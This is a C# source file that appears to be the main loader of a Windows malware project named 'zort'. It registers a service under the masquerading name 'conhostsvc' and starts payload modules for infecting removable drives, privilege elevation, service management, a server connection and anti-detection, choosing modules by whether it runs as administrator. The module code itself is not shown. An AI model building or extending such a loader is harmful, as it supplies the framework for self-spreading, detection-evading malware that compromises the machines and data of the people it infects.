using System;
using System.Collections.Generic;
using System.ServiceProcess;
using System.Threading.Tasks;

namespace zort
{
    class Program : ServiceBase
    {
        List<IPayloadModule> modules = new List<IPayloadModule>
                {
                    new RemovableInfector(),
                    new ElevationHelper(),
                    new ServiceManager(),
                    new ServerCon(),
                    new AntiDetection(),
                };

        public Program()
        {
            ServiceName = "conhostsvc";
        }

        static void Main(string[] args)
        {
            //if is admin install and start service else just init modules normally
            bool isAdmin = ElevationHelper.IsElevated();
            if (isAdmin)
            {
                using (var service = new Program())
                {
                    if (Environment.UserInteractive)
                    {
                        service.OnStart(args);
                        Console.WriteLine("Press any key to stop the service...");
                        Console.ReadKey();
                        service.OnStop();
                    }
                    else
                    {
                        ServiceBase.Run(service);
                    }
                }
            }
            else
            {
                var program = new Program();
                program.InitModules();
                Console.WriteLine("Press any key to exit...");
                Console.ReadKey();
            }
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                InitModules();
            }
            catch (Exception ex)
            {
                System.IO.File.AppendAllText("C:\\service-error.log", $"[{DateTime.Now}] ERROR: {ex}\n");
                throw;
            }
        }

        protected override void OnStop()
        {
            StopModules();
            base.OnStop();
        }

        private void StopModules()
        {
            modules.ForEach(m =>
            {
                Console.WriteLine($"Stopping module {m.ModuleName}");
                m.Stop();
            });
        }

        private void InitModules()
        {
            bool isAdmin = ElevationHelper.IsElevated();
            modules.ForEach(m =>
            {
                switch(m.ElevationType)
                {
                    case ElevationType.Elevated:
                        if (!isAdmin)
                        {
                            Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
                            return;
                        }
                        break;
                    case ElevationType.NonElevated:
                        if (isAdmin)
                        {
                            Console.WriteLine($"Skipping module {m.ModuleName}, it does not need to work unelevated.");
                            return;
                        }
                        break;
                }

                Console.WriteLine($"Starting module {m.ModuleName}");
                m.Start();
            });
        }
    }
}
